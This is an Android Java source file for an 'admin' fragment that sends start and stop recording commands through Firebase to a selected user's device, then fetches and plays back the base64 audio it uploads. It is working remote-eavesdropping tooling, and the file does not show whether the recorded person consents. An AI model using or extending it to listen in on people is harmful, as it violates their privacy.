package com.vikasyadavnsit.cdc.fragment;

import android.media.MediaPlayer;
import android.os.Bundle;
import android.util.Base64;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class AdminMicFragment extends Fragment {

    private TextView statusLabel;
    private TextView micRecordingInfo;
    private Button btnRecord;
    private Button btnStop;
    private TextView countdownText;
    private View playerContainer;
    private ImageView btnPlayPause;
    private ValueEventListener micListener;
    private ValueEventListener configListener;
    private MediaPlayer mediaPlayer;
    private String currentBase64;
    private boolean isPlaying = false;
    private long configuredDuration = 30000; // Default 30s
    private boolean configuredPersist = false;
    private android.os.CountDownTimer countDownTimer;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_admin_mic, container, false);

        view.findViewById(R.id.mic_back_button).setOnClickListener(v -> getParentFragmentManager().popBackStack());

        statusLabel = view.findViewById(R.id.mic_status_label);
        micRecordingInfo = view.findViewById(R.id.mic_recording_info);
        btnRecord = view.findViewById(R.id.btn_trigger_record);
        btnStop = view.findViewById(R.id.btn_stop_record);
        countdownText = view.findViewById(R.id.mic_countdown_text);
        playerContainer = view.findViewById(R.id.audio_player_container);
        btnPlayPause = view.findViewById(R.id.btn_play_pause);

        btnRecord.setOnClickListener(v -> triggerRecording());
        btnStop.setOnClickListener(v -> stopRecordingRemote());
        btnPlayPause.setOnClickListener(v -> togglePlayPause());

        view.findViewById(R.id.mic_delete_data).setOnClickListener(v -> {
            FirebaseUtils.deleteMicData();
            Toast.makeText(getContext(), "Mic data cleared", Toast.LENGTH_SHORT).show();
        });

        fetchMicConfig();
        listenForMicData();
        return view;
    }

    private void fetchMicConfig() {
        configListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    Object interval = snapshot.child("interval").getValue();
                    if (interval instanceof Number) {
                        configuredDuration = ((Number) interval).longValue();
                    }
                    
                    DataSnapshot extra = snapshot.child("extraConfig");
                    if (extra.exists()) {
                        Boolean persist = extra.child("persistMicRecordings").getValue(Boolean.class);
                        if (persist != null) configuredPersist = persist;
                    }
                    
                    if (isAdded()) {
                        statusLabel.setText("Ready (Duration: " + (configuredDuration / 1000) + "s" + 
                            (configuredPersist ? ", Persist: ON" : "") + ")");
                    }
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError error) {}
        };
        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/REQUEST_MIC_PERMISSION"))
                .addValueEventListener(configListener);
    }

    private void triggerRecording() {
        btnRecord.setEnabled(false);
        btnStop.setVisibility(View.VISIBLE);
        countdownText.setVisibility(View.VISIBLE);
        statusLabel.setText("Device is starting recording...");

        Map<String, Object> command = new HashMap<>();
        command.put("action", "START_RECORDING");
        command.put("duration", configuredDuration);
        command.put("persist", configuredPersist);
        command.put("timestamp", System.currentTimeMillis());

        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/commands/micRequest")).setValue(command);
        
        startCountdown(configuredDuration);
    }

    private void stopRecordingRemote() {
        if (countDownTimer != null) {
            countDownTimer.cancel();
        }
        countdownText.setVisibility(View.GONE);
        btnStop.setVisibility(View.GONE);
        
        Map<String, Object> command = new HashMap<>();
        command.put("action", "STOP_RECORDING");
        command.put("timestamp", System.currentTimeMillis());
        FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/commands/micRequest")).setValue(command);
        
        statusLabel.setText("Stopping recording...");
        btnRecord.setEnabled(true);
    }

    private void startCountdown(long millis) {
        if (countDownTimer != null) countDownTimer.cancel();
        
        countDownTimer = new android.os.CountDownTimer(millis, 1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                long seconds = millisUntilFinished / 1000;
                countdownText.setText(String.format(java.util.Locale.getDefault(), "Recording: %02d:%02d", seconds / 60, seconds % 60));
            }

            @Override
            public void onFinish() {
                countdownText.setText("Processing audio...");
                btnStop.setVisibility(View.GONE);
            }
        }.start();
    }

    private void togglePlayPause() {
        if (currentBase64 == null || currentBase64.isEmpty()) return;

        if (isPlaying) {
            stopPlayback();
        } else {
            startPlayback();
        }
    }

    private void startPlayback() {
        try {
            // Clean up old temp files
            File cacheDir = requireContext().getCacheDir();
            File tempFile = File.createTempFile("captured_audio", ".m4a", cacheDir);
            
            byte[] decodedBytes = Base64.decode(currentBase64, Base64.DEFAULT);
            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                fos.write(decodedBytes);
            }

            if (mediaPlayer != null) {
                mediaPlayer.release();
            }
            
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(tempFile.getAbsolutePath());
            mediaPlayer.prepare();
            mediaPlayer.start();
            isPlaying = true;
            btnPlayPause.setImageResource(android.R.drawable.ic_media_pause);

            mediaPlayer.setOnCompletionListener(mp -> stopPlayback());
            mediaPlayer.setOnErrorListener((mp, what, extra) -> {
                stopPlayback();
                Toast.makeText(getContext(), "Playback error", Toast.LENGTH_SHORT).show();
                return true;
            });

        } catch (IOException e) {
            Toast.makeText(getContext(), "Playback failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void stopPlayback() {
        if (mediaPlayer != null) {
            try {
                if (mediaPlayer.isPlaying()) mediaPlayer.stop();
            } catch (Exception ignored) {}
            mediaPlayer.release();
            mediaPlayer = null;
        }
        isPlaying = false;
        if (isAdded()) {
            btnPlayPause.setImageResource(android.R.drawable.ic_media_play);
        }
    }

    private void listenForMicData() {
        micListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!isAdded()) return;
                
                DataSnapshot latestSnap = snapshot.child("latest");
                if (!snapshot.exists() || !latestSnap.exists()) {
                    playerContainer.setVisibility(View.GONE);
                    statusLabel.setText("Ready to Record");
                    btnRecord.setEnabled(true);
                    btnRecord.setText("Start Recording");
                    btnStop.setVisibility(View.GONE);
                    countdownText.setVisibility(View.GONE);
                    if (countDownTimer != null) countDownTimer.cancel();
                    currentBase64 = null;
                    return;
                }

                if (latestSnap.getValue() instanceof String) {
                    currentBase64 = latestSnap.getValue(String.class);
                    micRecordingInfo.setText("Captured Audio (Legacy)");
                } else {
                    currentBase64 = latestSnap.child("audio").getValue(String.class);
                    Long ts = latestSnap.child("timestamp").getValue(Long.class);
                    if (ts != null) {
                        String timeStr = new java.text.SimpleDateFormat("dd MMM, hh:mm:ss a", java.util.Locale.getDefault()).format(new java.util.Date(ts));
                        micRecordingInfo.setText("Recorded: " + timeStr);
                    } else {
                        micRecordingInfo.setText("Captured Audio");
                    }
                }

                if (currentBase64 != null && !currentBase64.isEmpty()) {
                    playerContainer.setVisibility(View.VISIBLE);
                    statusLabel.setText("Latest Recording Available");
                    btnRecord.setEnabled(true);
                    btnRecord.setText("Record Again");
                    btnStop.setVisibility(View.GONE);
                    countdownText.setVisibility(View.GONE);
                    if (countDownTimer != null) countDownTimer.cancel();
                }
            }

            @Override public void onCancelled(@NonNull DatabaseError error) {}
        };
        FirebaseUtils.monitorMicData(micListener);
    }

    @Override
    public void onDestroyView() {
        FirebaseUtils.removeMicDataListener(micListener);
        if (configListener != null) {
            FirebaseUtils.getDbRef(FirebaseUtils.getSelectedUserPath("/appSettings/appTriggerSettingsDataMap/REQUEST_MIC_PERMISSION"))
                    .removeEventListener(configListener);
        }
        stopPlayback();
        super.onDestroyView();
    }
}
